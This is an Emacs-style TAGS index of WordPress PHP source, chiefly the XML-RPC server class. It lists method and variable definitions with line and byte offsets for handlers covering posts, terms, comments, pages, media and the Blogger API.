			$empty_array = array();empty_array299,8910
		$top_level_elements = array();top_level_elements316,9375
		$children_elements  = array();children_elements317,9408
		$total_top = count( $top_level_elements );total_top325,9602
			$this->max_pages = ceil($total_top / $per_page);max_pages327,9664
			$end = $total_top;end329,9723
			$top_level_elements = array_reverse( $top_level_elements );top_level_elements332,9795
			$oldstart = $start;oldstart333,9858
			$start = $total_top - $end;start334,9881
			$end = $total_top - $oldstart;end335,9912
			foreach ( $children_elements as $parent => $children )parent338,9998
			$empty_array = array();empty_array359,10603
	function get_number_of_root_elements( $elements ){get_number_of_root_elements368,10806
		$num = 0;num370,10859
		$parent_field = $this->db_fields['parent'];parent_field371,10871
	function unset_children( $e, &$children_elements ){unset_children381,11074
		$id_field = $this->db_fields['id'];id_field386,11176
		$id = $e->$id_field;id387,11214

wordpress/wp-includes/class-wp-xmlrpc-server.php,57865
class wp_xmlrpc_server extends IXR_Server {wp_xmlrpc_server22,475
	function __construct() {__construct35,819
		$this->methods = array(methods36,845
		$this->methods = apply_filters('xmlrpc_methods', $this->methods);methods127,4932
	function serve_request() {serve_request130,5004
	function sayHello($args) {sayHello142,5220
	function addTwoNumbers($args) {addTwoNumbers154,5418
		$number1 = $args[0];number1155,5451
		$number2 = $args[1];number2156,5474
	function login_pass_ok($user_login, $user_pass) {login_pass_ok171,5814
			$this->error = new IXR_Error( 405, sprintf( __( 'XML-RPC services are disabled on this site. An admin user can enable them at %s'),  admin_url('options-writing.php') ) );error173,5907
			$this->error = new IXR_Error(403, __('Bad login/pass combination.'));error178,6151
	function login($username, $password) {login193,6479
			$this->error = new IXR_Error( 405, sprintf( __( 'XML-RPC services are disabled on this site. An admin user can enable them at %s'),  admin_url('options-writing.php') ) );error195,6561
		$user = wp_authenticate($username, $password);user199,6757
			$this->error = new IXR_Error(403, __('Bad login/pass combination.'));error202,6835
	function escape(&$array) {escape218,7227
			foreach ( (array) $array as $k => $v ) {k224,7344
	function get_custom_fields($post_id) {get_custom_fields244,7709
		$post_id = (int) $post_id;post_id245,7749
		$custom_fields = array();custom_fields247,7779
	function set_custom_fields($post_id, $fields) {set_custom_fields272,8302
		$post_id = (int) $post_id;post_id273,8351
				$pmeta = get_metadata_by_mid( 'post', $meta['id'] );pmeta278,8490
	function initialise_blog_option_info() {initialise_blog_option_info302,9331
		$this->blog_options = array(blog_options305,9396
		$this->blog_options = apply_filters( 'xmlrpc_blog_options', $this->blog_options );blog_options431,13391
	function wp_getUsersBlogs( $args ) {wp_getUsersBlogs449,13769
		$username = $args[0];username459,14032
		$password = $args[1];password460,14056
		$blogs = (array) get_blogs_of_user( $user->ID );blogs467,14210
		$struct = array();struct468,14261
			$blog_id = $blog->userblog_id;blog_id475,14434
			$is_admin = current_user_can('manage_options');is_admin477,14497
	protected function minimum_args( $args, $count ) {minimum_args502,15128
			$this->error = new IXR_Error( 400, __( 'Insufficient arguments passed to this XML-RPC method.' ) );error504,15215
	protected function _prepare_taxonomy( $taxonomy, $fields ) {_prepare_taxonomy520,15626
		$_taxonomy = array(_taxonomy521,15688
	protected function _prepare_term( $term ) {_prepare_term550,16542
		$_term = $term;_term551,16587
			$_term = get_object_vars( $_term );_term553,16634
	protected function _convert_date( $date ) {_convert_date575,17349
		if ( $date === '0000-00-00 00:00:00' ) {date576,17394
	protected function _convert_date_gmt( $date_gmt, $date ) {_convert_date_gmt591,17736
		if ( $date !== '0000-00-00 00:00:00' && $date_gmt === '0000-00-00 00:00:00' ) {date_gmt592,17796
	protected function _prepare_post( $post, $fields ) {_prepare_post607,18285
		$_post = array( 'post_id' => strval( $post['ID'] ) );_post609,18400
		$post_fields = array(post_fields612,18489
		$thumbnail_id = get_post_thumbnail_id( $post['ID'] );thumbnail_id637,19761
			$thumbnail_size = current_theme_supports('post-thumbnail') ? 'post-thumbnail' : 'thumbnail';thumbnail_size639,19842
			$_post = array_merge( $_post, $post_fields );_post654,20467
			$requested_fields = array_intersect_key( $post_fields, array_flip( $fields ) );requested_fields656,20527
			$_post = array_merge( $_post, $requested_fields );_post657,20610
		$all_taxonomy_fields = in_array( 'taxonomies', $fields );all_taxonomy_fields660,20669
			$post_type_taxonomies = get_object_taxonomies( $post['post_type'], 'names' );post_type_taxonomies663,20794
			$terms = wp_get_object_terms( $post['ID'], $post_type_taxonomies );terms664,20875
			$enclosures = (array) get_post_meta( $post['ID'], 'enclosure' );enclosures676,21269
				$encdata = explode( "\n", $enclosures[0] );encdata678,21372
	protected function _prepare_post_type( $post_type, $fields ) {_prepare_post_type697,21948
		$_post_type = array(_post_type698,22012
	protected function _prepare_media_item( $media_item, $thumbnail_size = 'thumbnail' ) {_prepare_media_item739,23395
	protected function _prepare_media_item( $media_item, $thumbnail_size = 'thumbnail' ) {thumbnail_size739,23395
		$_media_item = array(_media_item740,23483
		$thumbnail_src = image_downsize( $media_item->ID, $thumbnail_size );thumbnail_src751,24014
	protected function _prepare_page( $page ) {_prepare_page768,24509
		$full_page = get_extended( $page->post_content );full_page770,24597
		$link = post_permalink( $page->ID );link771,24649
		$parent_title = "";parent_title774,24736
			$parent = get_page( $page->post_parent );parent776,24799
			$parent_title = $parent->post_title;parent_title777,24844
		$allow_comments = comments_open( $page->ID ) ? 1 : 0;allow_comments781,24931
		$allow_pings = pings_open( $page->ID ) ? 1 : 0;allow_pings782,24987
		$page_date = $this->_convert_date( $page->post_date );page_date785,25061
		$page_date_gmt = $this->_convert_date_gmt( $page->post_date_gmt, $page->post_date );page_date_gmt786,25118
		$categories = array();categories789,25246
		$author = get_userdata( $page->post_author );author795,25409
		$page_template = get_page_template_slug( $page->ID );page_template797,25458
			$page_template = 'default';page_template799,25547
		$_page = array(_page801,25579
	protected function _prepare_comment( $comment ) {_prepare_comment839,27050
		$comment_date = $this->_convert_date( $comment->comment_date );comment_date841,27124
		$comment_date_gmt = $this->_convert_date_gmt( $comment->comment_date_gmt, $comment->comment_date );comment_date_gmt842,27190
			$comment_status = 'hold';comment_status845,27336
			$comment_status = 'spam';comment_status847,27416
			$comment_status = 'approve';comment_status849,27493
			$comment_status = $comment->comment_approved;comment_status851,27532
		$_comment = array(_comment853,27582
	function wp_newPost( $args ) {wp_newPost904,29525
		$blog_id        = (int) $args[0];blog_id910,29652
		$username       = $args[1];username911,29688
		$password       = $args[2];password912,29718
		$content_struct = $args[3];content_struct913,29748
		if ( ! $user = $this->login( $username, $password ) )user915,29779
	private function _is_greater_than_one( $count ) {_is_greater_than_one932,30143
	protected function _insert_post( $user, $content_struct ) {_insert_post945,30496
		$defaults = array( 'post_status' => 'draft', 'post_type' => 'post', 'post_author' => 0,defaults946,30557
		$post_data = wp_parse_args( $content_struct, $defaults );post_data949,30740
		$post_type = get_post_type_object( $post_data['post_type'] );post_type951,30801
		$update = ! empty( $post_data['ID'] );update955,30947
			$author = get_userdata( $post_data['post_author'] );author995,32709
			$dateCreated = rtrim( $post_data['post_date_gmt']->getIso(), 'Z' ) . 'Z';dateCreated1012,33415
			$dateCreated = $post_data['post_date']->getIso();dateCreated1014,33544
		$post_ID = $post_data['ID'];post_ID1024,33928
			$post_type_taxonomies = get_object_taxonomies( $post_data['post_type'], 'objects' );post_type_taxonomies1057,35311
			$terms = array();terms1060,35453
				$taxonomies = array_keys( $post_data['terms'] );taxonomies1064,35598
					$term_ids = $post_data['terms'][$taxonomy];term_ids1074,36112
						$term = get_term_by( 'id', $term_id, $taxonomy );term1076,36202
				$taxonomies = array_keys( $post_data['terms_names'] );taxonomies1088,36536
					$ambiguous_terms = array();ambiguous_terms1098,37146
						$tax_term_names = get_terms( $taxonomy, array( 'fields' => 'names', 'hide_empty' => false ) );tax_term_names1100,37231
						$tax_term_names_count = array_count_values( $tax_term_names );tax_term_names_count1103,37387
						$ambiguous_tax_term_counts = array_filter( $tax_term_names_count, array( $this, '_is_greater_than_one') );ambiguous_tax_term_counts1106,37502
						$ambiguous_terms = array_keys( $ambiguous_tax_term_counts );ambiguous_terms1108,37616
					$term_names = $post_data['terms_names'][$taxonomy];term_names1111,37691
						$term = get_term_by( 'name', $term_name, $taxonomy );term1116,37974
							$term_info = wp_insert_term( $term_name, $taxonomy );term_info1124,38378
			$format = set_post_format( $post_ID, $post_data['post_format'] );format1144,39051
		$enclosure = isset( $post_data['enclosure'] ) ? $post_data['enclosure'] : null;enclosure1153,39285
		$post_data = apply_filters( 'xmlrpc_wp_insert_post_data', $post_data, $content_struct );post_data1158,39489
		$post_ID = wp_insert_post( $post_data, true );post_ID1160,39581
	function wp_editPost( $args ) {wp_editPost1186,40324
		$blog_id        = (int) $args[0];blog_id1192,40452
		$username       = $args[1];username1193,40488
		$password       = $args[2];password1194,40518
		$post_id        = (int) $args[3];post_id1195,40548
		$content_struct = $args[4];content_struct1196,40584
		if ( ! $user = $this->login( $username, $password ) )user1198,40615
		$post = get_post( $post_id, ARRAY_A );post1203,40742
		$merged_content_struct = array_merge( $post, $content_struct );merged_content_struct1219,41406
		$retval = $this->_insert_post( $user, $merged_content_struct );retval1221,41473
	function wp_deletePost( $args ) {wp_deletePost1241,41904
		$blog_id    = (int) $args[0];blog_id1247,42034
		$username   = $args[1];username1248,42066
		$password   = $args[2];password1249,42092
		$post_id    = (int) $args[3];post_id1250,42118
		if ( ! $user = $this->login( $username, $password ) )user1252,42151
		$post = wp_get_single_post( $post_id, ARRAY_A );post1257,42280
		$post_type = get_post_type_object( $post['post_type'] );post_type1261,42420
		$result = wp_delete_post( $post_id );result1265,42639
	function wp_getPost( $args ) {wp_getPost1317,44014
		$blog_id            = (int) $args[0];blog_id1323,44141
		$username           = $args[1];username1324,44181
		$password           = $args[2];password1325,44215
		$post_id            = (int) $args[3];post_id1326,44249
			$fields = $args[4];fields1329,44317
			$fields = apply_filters( 'xmlrpc_default_post_fields', array( 'post', 'terms', 'custom_fields' ), 'wp.getPost' );fields1331,44347
		if ( ! $user = $this->login( $username, $password ) )user1333,44465
		$post = wp_get_single_post( $post_id, ARRAY_A );post1338,44591
		$post_type = get_post_type_object( $post['post_type'] );post_type1343,44732
	function wp_getPosts( $args ) {wp_getPosts1374,45694
		$blog_id    = (int) $args[0];blog_id1380,45822
		$username   = $args[1];username1381,45854
		$password   = $args[2];password1382,45880
		$filter     = isset( $args[3] ) ? $args[3] : array();filter1383,45906
			$fields = $args[4];fields1386,45990
			$fields = apply_filters( 'xmlrpc_default_post_fields', array( 'post', 'terms', 'custom_fields' ), 'wp.getPosts' );fields1388,46020
		if ( ! $user = $this->login( $username, $password ) )user1390,46139
		$query = array();query1395,46266
			$post_type = get_post_type_object( $filter['post_type'] );post_type1398,46328
			$post_type = get_post_type_object( 'post' );post_type1402,46514
		$posts_list = wp_get_recent_posts( $query );posts_list1426,47207
		$struct = array();struct1432,47328
			$post_type = get_post_type_object( $post['post_type'] );post_type1435,47387
	function wp_newTerm( $args ) {wp_newTerm1465,48073
		$blog_id            = (int) $args[0];blog_id1471,48200
		$username           = $args[1];username1472,48240
		$password           = $args[2];password1473,48274
		$content_struct     = $args[3];content_struct1474,48308
		if ( ! $user = $this->login( $username, $password ) )user1476,48343
		$taxonomy = get_taxonomy( $content_struct['taxonomy'] );taxonomy1484,48586
		$taxonomy = (array) $taxonomy;taxonomy1489,48802
		$term_data = array();term_data1492,48867
			$parent_term_id = (int) $content_struct['parent'];parent_term_id1502,49220
			$parent_term = get_term( $parent_term_id , $taxonomy['name'] );parent_term1503,49274
		$term = wp_insert_term( $term_data['name'] , $taxonomy['name'] , $term_data );term1520,49808
	function wp_editTerm( $args ) {wp_editTerm1552,50629
		$blog_id            = (int) $args[0];blog_id1558,50757
		$username           = $args[1];username1559,50797
		$password           = $args[2];password1560,50831
		$term_id            = (int) $args[3];term_id1561,50865
		$content_struct     = $args[4];content_struct1562,50905
		if ( ! $user = $this->login( $username, $password ) )user1564,50940
		$taxonomy = get_taxonomy( $content_struct['taxonomy'] );taxonomy1572,51184
		$taxonomy = (array) $taxonomy;taxonomy1577,51396
		$term_data = array();term_data1580,51461
		$term = get_term( $term_id , $content_struct['taxonomy'] );term1582,51486
			$parent_term_id = (int) $content_struct['parent'];parent_term_id1601,52121
			$parent_term = get_term( $parent_term_id , $taxonomy['name'] );parent_term1602,52175
		$term = wp_update_term( $term_id , $taxonomy['name'] , $term_data );term1619,52709
	function wp_deleteTerm( $args ) {wp_deleteTerm1644,53317
		$blog_id            = (int) $args[0];blog_id1650,53447
		$username           = $args[1];username1651,53487
		$password           = $args[2];password1652,53521
		$taxonomy           = $args[3];taxonomy1653,53555
		$term_id            = (int) $args[4];term_id1654,53589
		if ( ! $user = $this->login( $username, $password ) )user1656,53630
		$taxonomy = get_taxonomy( $taxonomy );taxonomy1664,53858
		$term = get_term( $term_id, $taxonomy->name );term1669,54056
		$result = wp_delete_term( $term_id, $taxonomy->name );result1677,54272
	function wp_getTerm( $args ) {wp_getTerm1711,54980
		$blog_id            = (int) $args[0];blog_id1717,55107
		$username           = $args[1];username1718,55147
		$password           = $args[2];password1719,55181
		$taxonomy           = $args[3];taxonomy1720,55215
		$term_id            = (int) $args[4];term_id1721,55249
		if ( ! $user = $this->login( $username, $password ) )user1723,55290
		$taxonomy = get_taxonomy( $taxonomy );taxonomy1731,55515
		$term = get_term( $term_id , $taxonomy->name, ARRAY_A );term1736,55713
	function wp_getTerms( $args ) {wp_getTerms1764,56458
		$blog_id        = (int) $args[0];blog_id1770,56586
		$username       = $args[1];username1771,56622
		$password       = $args[2];password1772,56652
		$taxonomy       = $args[3];taxonomy1773,56682
		$filter         = isset( $args[4] ) ? $args[4] : array();filter1774,56712
		if ( ! $user = $this->login( $username, $password ) )user1776,56773
		$taxonomy = get_taxonomy( $taxonomy );taxonomy1784,56999
		$query = array();query1789,57197
		$terms = get_terms( $taxonomy->name, $query );terms1812,57759
		$struct = array();struct1817,57902
	function wp_getTaxonomy( $args ) {wp_getTaxonomy1839,58305
		$blog_id        = (int) $args[0];blog_id1845,58436
		$username       = $args[1];username1846,58472
		$password       = $args[2];password1847,58502
		$taxonomy       = $args[3];taxonomy1848,58532
			$fields = $args[4];fields1851,58590
			$fields = apply_filters( 'xmlrpc_default_taxonomy_fields', array( 'labels', 'cap', 'object_type' ), 'wp.getTaxonomy' );fields1853,58620
		if ( ! $user = $this->login( $username, $password ) )user1855,58744
		$taxonomy = get_taxonomy( $taxonomy );taxonomy1863,58973
	function wp_getTaxonomies( $args ) {wp_getTaxonomies1883,59478
		$blog_id            = (int) $args[0];blog_id1889,59611
		$username           = $args[1];username1890,59651
		$password           = $args[2];password1891,59685
		$filter             = isset( $args[3] ) ? $args[3] : array( 'public' => true );filter1892,59719
			$fields = $args[4];fields1895,59829
			$fields = apply_filters( 'xmlrpc_default_taxonomy_fields', array( 'labels', 'cap', 'object_type' ), 'wp.getTaxonomies' );fields1897,59859
		if ( ! $user = $this->login( $username, $password ) )user1899,59985
		$taxonomies = get_taxonomies( $filter, 'objects' );taxonomies1904,60117
		$struct = array();struct1907,60205
	function wp_getPage($args) {wp_getPage1932,60658
		$blog_id	= (int) $args[0];blog_id1935,60713
		$page_id	= (int) $args[1];page_id1936,60742
		$username	= $args[2];username1937,60771
		$password	= $args[3];password1938,60795
		$page = get_page($page_id);page1944,60904
	function wp_getPages($args) {wp_getPages1975,61638
		$blog_id	= (int) $args[0];blog_id1978,61694
		$username	= $args[1];username1979,61723
		$password	= $args[2];password1980,61747
		$num_pages	= isset($args[3]) ? (int) $args[3] : 10;num_pages1981,61771
		$pages = get_posts( array('post_type' => 'page', 'post_status' => 'any', 'numberposts' => $num_pages) );pages1991,62063
		$num_pages = count($pages);num_pages1992,62170
			$pages_struct = array();pages_struct1996,62276
	function wp_newPage($args) {wp_newPage2019,62723
		$username	= $this->escape($args[1]);username2021,62809
		$password	= $this->escape($args[2]);password2022,62848
		$page		= $args[3];page2023,62887
		$publish	= $args[4];publish2024,62908
	function wp_deletePage($args) {wp_deletePage2046,63344
		$blog_id	= (int) $args[0];blog_id2049,63402
		$username	= $args[1];username2050,63431
		$password	= $args[2];password2051,63455
		$page_id	= (int) $args[3];page_id2052,63479
		$actual_page = wp_get_single_post($page_id, ARRAY_A);actual_page2061,63728
		$result = wp_delete_post($page_id);result2070,64128
	function wp_editPage($args) {wp_editPage2087,64452
		$blog_id	= (int) $args[0];blog_id2089,64540
		$page_id	= (int) $this->escape($args[1]);page_id2090,64569
		$username	= $this->escape($args[2]);username2091,64613
		$password	= $this->escape($args[3]);password2092,64652
		$content	= $args[4];content2093,64691
		$publish	= $args[5];publish2094,64714
		$actual_page = wp_get_single_post($page_id, ARRAY_A);actual_page2102,64911
		$args = array(args2114,65409
	function wp_getPageList($args) {wp_getPageList2134,65710
		$blog_id				= (int) $args[0];blog_id2139,65786
		$username				= $args[1];username2140,65818
		$password				= $args[2];password2141,65845
		$page_list = $wpdb->get_results("page_list2152,66151
		$num_pages = count($page_list);num_pages2165,66437
		for ( $i = 0; $i < $num_pages; $i++ ) {i2166,66471
	function wp_getAuthors($args) {wp_getAuthors2186,66993
		$blog_id	= (int) $args[0];blog_id2190,67052
		$username	= $args[1];username2191,67081
		$password	= $args[2];password2192,67105
		$authors = array();authors2202,67377
	function wp_getTags( $args ) {wp_getTags2222,67794
		$blog_id		= (int) $args[0];blog_id2225,67853
		$username		= $args[1];username2226,67883
		$password		= $args[2];password2227,67908
		$tags = array();tags2237,68220
		if ( $all_tags = get_tags() ) {all_tags2239,68240
	function wp_newCategory($args) {wp_newCategory2263,68800
		$blog_id				= (int) $args[0];blog_id2266,68859
		$username				= $args[1];username2267,68891
		$password				= $args[2];password2268,68918
		$category				= $args[3];category2269,68945
		$new_category = array(new_category2294,69740
		$cat_id = wp_insert_category($new_category, true);cat_id2301,69959
	function wp_deleteCategory($args) {wp_deleteCategory2324,70578
		$blog_id		= (int) $args[0];blog_id2327,70640
		$username		= $args[1];username2328,70670
		$password		= $args[2];password2329,70695
		$category_id	= (int) $args[3];category_id2330,70720
		$status = wp_delete_term( $category_id, 'category' );status2340,71027
	function wp_suggestCategories($args) {wp_suggestCategories2356,71332
		$blog_id				= (int) $args[0];blog_id2359,71397
		$username				= $args[1];username2360,71429
		$password				= $args[2];password2361,71456
		$category				= $args[3];category2362,71483
		$max_results			= (int) $args[4];max_results2363,71510
		$category_suggestions = array();category_suggestions2373,71842
		$args = array('get' => 'all', 'number' => $max_results, 'name__like' => $category);args2374,71877
	function wp_getComment($args) {wp_getComment2393,72288
		$blog_id	= (int) $args[0];blog_id2396,72346
		$username	= $args[1];username2397,72375
		$password	= $args[2];password2398,72399
		$comment_id	= (int) $args[3];comment_id2399,72423
		if ( ! $comment = get_comment($comment_id) )comment2409,72727
	function wp_getComments($args) {wp_getComments2434,73682
		$blog_id	= (int) $args[0];blog_id2437,73741
		$username	= $args[1];username2438,73770
		$password	= $args[2];password2439,73794
		$struct		= isset( $args[3] ) ? $args[3] : array();struct2440,73818
			$status = $struct['status'];status2451,74156
			$status = '';status2453,74195
		$post_id = '';post_id2455,74213
			$post_id = absint($struct['post_id']);post_id2457,74265
		$offset = 0;offset2459,74308
			$offset = absint($struct['offset']);offset2461,74357
		$number = 10;number2463,74398
			$number = absint($struct['number']);number2465,74448
		$comments = get_comments( array('status' => $status, 'post_id' => $post_id, 'offset' => $offset, 'number' => $number ) );comments2467,74489
		$comments_struct = array();comments_struct2469,74614
	function wp_deleteComment($args) {wp_deleteComment2494,75158
		$blog_id	= (int) $args[0];blog_id2497,75219
		$username	= $args[1];username2498,75248
		$password	= $args[2];password2499,75272
		$comment_ID	= (int) $args[3];comment_ID2500,75296
		$status = wp_delete_comment( $comment_ID );status2516,75856
	function wp_editComment($args) {wp_editComment2548,76659
		$blog_id	= (int) $args[0];blog_id2551,76718
		$username	= $args[1];username2552,76747
		$password	= $args[2];password2553,76771
		$comment_ID	= (int) $args[3];comment_ID2554,76795
		$content_struct = $args[4];content_struct2555,76827
			$statuses = get_comment_statuses();statuses2572,77427
			$statuses = array_keys($statuses);statuses2573,77466
			$comment_approved = $content_struct['status'];comment_approved2577,77630
			$dateCreated = rtrim( $content_struct['date_created_gmt']->getIso(), 'Z' ) . 'Z';dateCreated2583,77862
			$comment_date = get_date_from_gmt(iso8601_to_datetime($dateCreated));comment_date2584,77947
			$comment_date_gmt = iso8601_to_datetime($dateCreated, 'GMT');comment_date_gmt2585,78020
			$comment_content = $content_struct['content'];comment_content2589,78133
			$comment_author = $content_struct['author'];comment_author2592,78226
			$comment_author_url = $content_struct['author_url'];comment_author_url2595,78321
			$comment_author_email = $content_struct['author_email'];comment_author_email2598,78426
		$comment = compact('comment_ID', 'comment_content', 'comment_approved', 'comment_date', 'comment_date_gmt', 'comment_author', 'comment_author_email', 'comment_author_url');comment2601,78527
		$result = wp_update_comment($comment);result2603,78703
	function wp_newComment($args) {wp_newComment2623,79196
		$blog_id	= (int) $args[0];blog_id2628,79271
		$username	= $args[1];username2629,79300
		$password	= $args[2];password2630,79324
		$post		= $args[3];post2631,79348
		$content_struct = $args[4];content_struct2632,79369
		$allow_anon = apply_filters('xmlrpc_allow_anonymous_comments', false);allow_anon2634,79400
		$user = $this->login($username, $password);user2636,79474
			$logged_in = false;logged_in2639,79539
			$logged_in = true;logged_in2645,79762
			$post_id = absint($post);post_id2649,79816
			$post_id = url_to_postid($post);post_id2651,79852
		$comment_ID = wp_new_comment( $comment );comment_ID2695,81514
	function wp_getCommentStatusList($args) {wp_getCommentStatusList2710,81793
		$blog_id	= (int) $args[0];blog_id2713,81863
		$username	= $args[1];username2714,81892
		$password	= $args[2];password2715,81916
	function wp_getCommentCount( $args ) {wp_getCommentCount2736,82382
		$blog_id	= (int) $args[0];blog_id2739,82447
		$username	= $args[1];username2740,82476
		$password	= $args[2];password2741,82500
		$post_id	= (int) $args[3];post_id2742,82524
		$count = wp_count_comments( $post_id );count2752,82822
	function wp_getPostStatusList( $args ) {wp_getPostStatusList2769,83167
		$blog_id	= (int) $args[0];blog_id2772,83236
		$username	= $args[1];username2773,83265
		$password	= $args[2];password2774,83289
	function wp_getPageStatusList( $args ) {wp_getPageStatusList2795,83742
		$blog_id	= (int) $args[0];blog_id2798,83811
		$username	= $args[1];username2799,83840
		$password	= $args[2];password2800,83864
	function wp_getPageTemplates( $args ) {wp_getPageTemplates2821,84318
		$blog_id	= (int) $args[0];blog_id2824,84386
		$username	= $args[1];username2825,84415
		$password	= $args[2];password2826,84439
		$templates = get_page_templates();templates2834,84682
	function wp_getOptions( $args ) {wp_getOptions2848,84904
		$blog_id	= (int) $args[0];blog_id2851,84966
		$username	= $args[1];username2852,84995
		$password	= $args[2];password2853,85019
		$options	= isset( $args[3] ) ? (array) $args[3] : array();options2854,85043
			$options = array_keys($this->blog_options);options2861,85279
	function _getOptions($options) {_getOptions2874,85513
		$data = array();data2875,85547
	function wp_setOptions( $args ) {wp_setOptions2898,86066
		$blog_id	= (int) $args[0];blog_id2901,86128
		$username	= $args[1];username2902,86157
		$password	= $args[2];password2903,86181
		$options	= (array) $args[3];options2904,86205
		foreach ( $options as $o_name => $o_value ) {o_name2912,86443
	function wp_getMediaItem($args) {wp_getMediaItem2947,87209
		$blog_id		= (int) $args[0];blog_id2950,87269
		$username		= $args[1];username2951,87299
		$password		= $args[2];password2952,87324
		$attachment_id	= (int) $args[3];attachment_id2953,87349
		if ( ! $attachment = get_post($attachment_id) )attachment2963,87642
	function wp_getMediaLibrary($args) {wp_getMediaLibrary2992,88795
		$blog_id	= (int) $args[0];blog_id2995,88858
		$username	= $args[1];username2996,88887
		$password	= $args[2];password2997,88911
		$struct		= isset( $args[3] ) ? $args[3] : array() ;struct2998,88935
		$parent_id = ( isset($struct['parent_id']) ) ? absint($struct['parent_id']) : '' ;parent_id3008,89250
		$mime_type = ( isset($struct['mime_type']) ) ? $struct['mime_type'] : '' ;mime_type3009,89335
		$offset = ( isset($struct['offset']) ) ? absint($struct['offset']) : 0 ;offset3010,89412
		$number = ( isset($struct['number']) ) ? absint($struct['number']) : -1 ;number3011,89487
		$attachments = get_posts( array('post_type' => 'attachment', 'post_parent' => $parent_id, 'offset' => $offset, 'numberposts' => $number, 'post_mime_type' => $mime_type ) );attachments3013,89564
		$attachments_struct = array();attachments_struct3015,89740
	function wp_getPostFormats( $args ) {wp_getPostFormats3034,90134
		$blog_id = (int) $args[0];blog_id3037,90200
		$username = $args[1];username3038,90229
		$password = $args[2];password3039,90253
		$formats = get_post_format_strings();formats3049,90550
					$supported = get_theme_support( 'post-formats' );supported3055,90800
					$formats = $data;formats3060,90928
	function wp_getPostType( $args ) {wp_getPostType3091,91472
		$blog_id        = (int) $args[0];blog_id3097,91603
		$username       = $args[1];username3098,91639
		$password       = $args[2];password3099,91669
		$post_type_name = $args[3];post_type_name3100,91699
			$fields = $args[4];fields3103,91757
			$fields = apply_filters( 'xmlrpc_default_posttype_fields', array( 'labels', 'cap', 'taxonomies' ), 'wp.getPostType' );fields3105,91787
		$post_type = get_post_type_object( $post_type_name );post_type3115,92145
	function wp_getPostTypes( $args ) {wp_getPostTypes3137,92695
		$blog_id            = (int) $args[0];blog_id3143,92827
		$username           = $args[1];username3144,92867
		$password           = $args[2];password3145,92901
		$filter             = isset( $args[3] ) ? $args[3] : array( 'public' => true );filter3146,92935
			$fields = $args[4];fields3149,93045
			$fields = apply_filters( 'xmlrpc_default_posttype_fields', array( 'labels', 'cap', 'taxonomies' ), 'wp.getPostTypes' );fields3151,93075
		if ( ! $user = $this->login( $username, $password ) )user3153,93199
		$post_types = get_post_types( $filter, 'objects' );post_types3158,93330
		$struct = array();struct3160,93385
	function blogger_getUsersBlogs($args) {blogger_getUsersBlogs3186,93942
		$username = $args[1];username3192,94083
		$password  = $args[2];password3193,94107
		$is_admin = current_user_can('manage_options');is_admin3200,94265
		$struct = array(struct3202,94316
	 * Private function for retrieving a users blogs for multisite setupsfor3214,94551
	function _multisite_getUsersBlogs($args) {_multisite_getUsersBlogs3218,94653
		$domain = $current_blog->domain;domain3220,94721
		$path = $current_blog->path . 'xmlrpc.php';path3221,94756
		$protocol = is_ssl() ? 'https' : 'http';protocol3222,94802
		$rpc = new IXR_Client("$protocol://{$domain}{$path}");rpc3224,94846
		$blogs = $rpc->getResponse();blogs3226,94958
	function blogger_getUserInfo($args) {blogger_getUserInfo3252,95550
		$username = $args[1];username3256,95615
		$password  = $args[2];password3257,95639
		$struct = array(struct3267,95937
	function blogger_getPost($args) {blogger_getPost3286,96269
		$post_ID    = (int) $args[1];post_ID3290,96330
		$username = $args[2];username3291,96362
		$password  = $args[3];password3292,96386
		$post_data = wp_get_single_post($post_ID, ARRAY_A);post_data3297,96490
		$categories = implode(',', wp_get_post_categories($post_ID));categories3306,96801
		$content  = '<title>'.stripslashes($post_data['post_title']).'</title>';content3308,96866
		$struct = array(struct3312,97052
	function blogger_getRecentPosts($args) {blogger_getRecentPosts3330,97415
		$blog_ID    = (int) $args[1]; /* though we don't use it yet */blog_ID3335,97516
		$username = $args[2];username3336,97581
		$password  = $args[3];password3337,97605
			$query = array( 'numberposts' => absint( $args[4] ) );query3339,97657
			$query = array();query3341,97722
		$posts_list = wp_get_recent_posts( $query );posts_list3348,97877
			$this->error = new IXR_Error(500, __('Either there are no posts, or something went wrong.'));error3351,97949
			$post_date  = $this->_convert_date( $entry['post_date'] );post_date3359,98183
			$categories = implode(',', wp_get_post_categories($entry['ID']));categories3360,98245
			$content  = '<title>'.stripslashes($entry['post_title']).'</title>';content3362,98315
		$recent_posts = array();recent_posts3375,98668
		for ( $j=0; $j<count($struct); $j++ ) {j3376,98695
	function blogger_getTemplate($args) {blogger_getTemplate3391,98945
		$blog_ID    = (int) $args[1];blog_ID3395,99010
		$username = $args[2];username3396,99042
		$password  = $args[3];password3397,99066
		$template   = $args[4]; /* could be 'main' or 'archiveIndex', but we don't use it */template3398,99091
		$filename = get_option('home') . '/';filename3409,99519
		$filename = preg_replace('#https?://.+?/#', $_SERVER['DOCUMENT_ROOT'].'/', $filename);filename3410,99559
		$f = fopen($filename, 'r');f3412,99649
		$content = fread($f, filesize($filename));content3413,99679
		// FIXME: (or delete me) do we really want to cater to bad clients at the expense of good ones by BEEPing up their line breaks? commented. $content = str_replace("\n", "\r\n", $content);content3417,99800
	function blogger_setTemplate($args) {blogger_setTemplate3430,100165
		$blog_ID    = (int) $args[1];blog_ID3434,100230
		$username = $args[2];username3435,100262
		$password  = $args[3];password3436,100286
		$content    = $args[4];content3437,100311
		$template   = $args[5]; /* could be 'main' or 'archiveIndex', but we don't use it */template3438,100337
		$filename = get_option('home') . '/';filename3449,100765
		$filename = preg_replace('#https?://.+?/#', $_SERVER['DOCUMENT_ROOT'].'/', $filename);filename3450,100805
	function blogger_newPost($args) {blogger_newPost3470,101251
		$blog_ID    = (int) $args[1]; /* though we don't use it yet */blog_ID3474,101312
		$username = $args[2];username3475,101377
		$password  = $args[3];password3476,101401
		$content    = $args[4];content3477,101426
		$publish    = $args[5];publish3478,101452
		$cap = ($publish) ? 'publish_posts' : 'edit_posts';cap3485,101605
		$post_status = ($publish) ? 'publish' : 'draft';post_status3489,101779
		$post_author = $user->ID;post_author3491,101831
		$post_title = xmlrpc_getposttitle($content);post_title3493,101860
		$post_category = xmlrpc_getpostcategory($content);post_category3494,101907
		$post_content = xmlrpc_removepostdata($content);post_content3495,101960
		$post_date = current_time('mysql');post_date3497,102012
		$post_date_gmt = current_time('mysql', 1);post_date_gmt3498,102050
		$post_data = compact('blog_ID', 'post_author', 'post_date', 'post_date_gmt', 'post_content', 'post_title', 'post_category', 'post_status');post_data3500,102096
		$post_ID = wp_insert_post($post_data);post_ID3502,102239
	function blogger_editPost($args) {blogger_editPost3524,102772
		$post_ID     = (int) $args[1];post_ID3528,102834
		$username  = $args[2];username3529,102867
